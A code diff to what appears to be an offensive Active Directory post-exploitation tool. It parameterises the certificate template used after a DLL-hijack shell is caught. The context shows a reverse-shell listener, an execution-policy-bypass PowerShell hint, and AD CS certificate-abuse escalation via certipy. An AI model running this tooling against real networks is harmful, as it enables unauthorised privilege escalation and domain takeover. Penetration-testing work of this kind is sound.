@@ -178,7 +178,13 @@ def _resolve_enroll_targets(session: Session) -> tuple[str, str, str]:
     return dns, dns, ca_name
 
 
-def _handle_pivot_shell(session: Session, run_as_user: str, probe_output: str) -> None:
+def _handle_pivot_shell(
+    session: Session,
+    run_as_user: str,
+    probe_output: str,
+    *,
+    enroll_template: str = "User",
+) -> None:
     """After shell as pivot target, show next escalate step and local AD CS enroll script."""
     parsed = parse_shell_username(probe_output)
     effective_user = parsed or run_as_user
@@ -199,16 +205,17 @@ def _handle_pivot_shell(session: Session, run_as_user: str, probe_output: str) -
         certs_dir = ws_path / "certs"
         certs_dir.mkdir(parents=True, exist_ok=True)
         enroll_dns, enroll_ca_host, enroll_ca_name = _resolve_enroll_targets(session)
+        template = enroll_template or "User"
         profile = load_enroll_profile(
             session,
-            template="UpdateSrv",
+            template=template,
             dns_name=enroll_dns,
             ca_host=enroll_ca_host,
             ca_name=enroll_ca_name,
             run_as_user=effective_user,
         )
         ps = build_local_enroll_powershell(
-            template="UpdateSrv",
+            template=template,
             dns_name=enroll_dns,
             profile=profile,
             run_as_user=effective_user,
@@ -216,7 +223,7 @@ def _handle_pivot_shell(session: Session, run_as_user: str, probe_output: str) -
         script = certs_dir / f"enroll_{effective_user.replace('.', '_')}.ps1"
         script.write_text(ps + "\n", encoding="utf-8")
         print_info(f"pivot shell as {effective_user} — NEXT: WSUS + vulnerable template cert chain")
-        print_info("in shell: powershell -ep bypass -File <drop_path>\\enroll.ps1")
+        print_info("in shell: powershell -ep bypass -File <drop_path>\\<enroll_script>")
         print_info("or: admapper postex run --mode enroll (DLL auto-enroll on task trigger)")
         run_escalate_analysis(session, pivot_user=effective_user)
         result = run_certipy_enrollment(session, finding_id="adcs-002", dns_name=enroll_dns)
@@ -240,7 +247,7 @@ def run_dll_hijack(
     use_ncat: bool = False,
     no_listener: bool = False,
     payload_mode: PayloadMode = "shell",
-    enroll_template: str = "UpdateSrv",
+    enroll_template: str = "User",
     enroll_dns: str | None = None,
     enroll_ca_name: str | None = None,
     enroll_ca_host: str | None = None,
@@ -361,7 +368,12 @@ def run_dll_hijack(
             if cap.connected and cap.output:
                 print_success("shell probe output:")
                 print_info(cap.output[:1200])
-                _handle_pivot_shell(session, deploy.run_as_user, cap.output)
+                _handle_pivot_shell(
+                    session,
+                    deploy.run_as_user,
+                    cap.output,
+                    enroll_template=enroll_template,
+                )
 
         shell_user = deploy.run_as_user
         if shell_connected and shell_output:
